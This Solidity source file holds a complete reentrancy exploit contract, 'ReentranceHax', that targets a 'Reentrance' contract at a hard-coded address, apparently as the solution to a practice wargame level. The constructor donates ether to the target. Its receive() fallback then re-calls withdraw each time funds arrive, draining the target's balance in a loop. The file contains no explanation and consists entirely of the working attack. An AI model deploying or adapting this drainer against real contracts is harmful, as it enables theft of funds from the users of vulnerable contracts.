// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceHax {
    IReentrance public reentrance;
    uint256 public amountToDrain;

    constructor() public payable {
        amountToDrain = msg.value;
        reentrance = IReentrance(0x8553FF675b665583cA889432Ab98FC26387bb1A7);
        reentrance.donate{value: msg.value}(address(this));
    }

    receive() external payable {
        reentrance.withdraw(amountToDrain);
    }

    function startHack() external {
        reentrance.withdraw(amountToDrain);
    }
}
